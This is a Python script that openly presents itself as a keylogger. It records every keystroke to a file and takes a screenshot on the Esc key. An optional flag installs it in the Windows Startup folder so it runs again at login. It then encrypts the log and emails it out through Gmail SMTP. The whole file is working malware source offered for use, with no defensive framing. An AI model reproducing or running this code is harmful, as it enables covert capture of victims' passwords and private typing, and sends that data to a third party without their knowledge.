import os
import smtplib
import time
import argparse
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput import keyboard
from cryptography.fernet import Fernet
from PIL import ImageGrab
from art import *

# Generate and save a key for encryption
def generate_key():
    key = Fernet.generate_key()
    with open("secret.key", "wb") as key_file:
        key_file.write(key)

# Load the previously generated key
def load_key():
    return open("secret.key", "rb").read()

# Encrypt the log file
def encrypt_file(file_name, key):
    fernet = Fernet(key)
    with open(file_name, "rb") as file:
        file_data = file.read()
    encrypted_data = fernet.encrypt(file_data)
    with open(file_name, "wb") as file:
        file.write(encrypted_data)

# Log key presses to a file
def log_to_file(key):
    with open("keylog.txt", "a") as file:
        file.write(key)

# Capture a screenshot
def capture_screenshot():
    screenshot = ImageGrab.grab()
    screenshot.save(f"screenshot_{time.time()}.png")

# Send an email with the log file
def send_email():
    from_addr = os.getenv('EMAIL')
    to_addr = os.getenv('RECIPIENT_EMAIL')
    password = os.getenv('EMAIL_PASSWORD')
    subject = "Keylogger Log File"
    body = "Attached is the keylogger log file."

    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    filename = "keylog.txt"
    attachment = open(filename, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f"attachment; filename= {filename}")
    msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(from_addr, password)
    text = msg.as_string()
    server.sendmail(from_addr, to_addr, text)
    server.quit()

# Callback function when a key is pressed
def on_press(key):
    try:
        log_to_file(str(key.char))
    except AttributeError:
        if key == keyboard.Key.space:
            log_to_file(' ')
        elif key == keyboard.Key.enter:
            log_to_file('\n')
        elif key == keyboard.Key.esc:
            # Capture a screenshot on ESC press
            capture_screenshot()
            return False
        else:
            log_to_file(f'[{key}]')

# Start the keylogger
def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    # Display ASCII art banner
    ascii_art = text2art("Keylogger")
    print(ascii_art)

    # Set up argument parsing
    parser = argparse.ArgumentParser(description="Keylogger with enhanced functionalities")
    parser.add_argument("--persist", action="store_true", help="Enable persistence by adding the script to startup")
    args = parser.parse_args()

    if args.persist:
        # Add the script to startup (Windows example, change for Linux/Mac)
        startup_path = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\keylogger.bat")
        with open(startup_path, "w") as bat_file:
            bat_file.write(f'python {os.path.abspath(__file__)}\n')

    generate_key()
    start_keylogger()
    encrypt_file("keylog.txt", load_key())
    send_email()
